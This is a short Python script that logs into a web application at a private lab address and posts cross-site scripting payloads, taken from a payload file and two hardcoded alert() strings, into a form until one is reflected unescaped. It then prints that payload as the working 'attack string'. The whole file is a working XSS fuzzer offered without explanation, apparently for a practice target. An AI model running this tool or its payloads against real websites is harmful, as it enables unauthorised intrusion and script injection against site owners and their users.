
import requests
url = "http://192.168.56.135:2009"
payloads1 = []
with open("./payload.txt", 'r', encoding="utf-8") as f:
    while True:
        line = f.readline()
        if not line:
            break
        payloads1.append(line)
payloads = ['<script>alert(1);</script>', '<body onload = alert(1) >']


def login(url):
    data = {"uname": "test", "pw": "123"}
    req = requests.post(url, data=data)
    return req


for payload in payloads1:
    data = {'title': 'abc', 'content': payload, 'sub': 'Post'}
    req = requests.post(
        url, data=data, cookies=login("http://192.168.56.135:2009/login.php").cookies)
    if payload in req.text:
        print("Attack string: "+payload)
        break
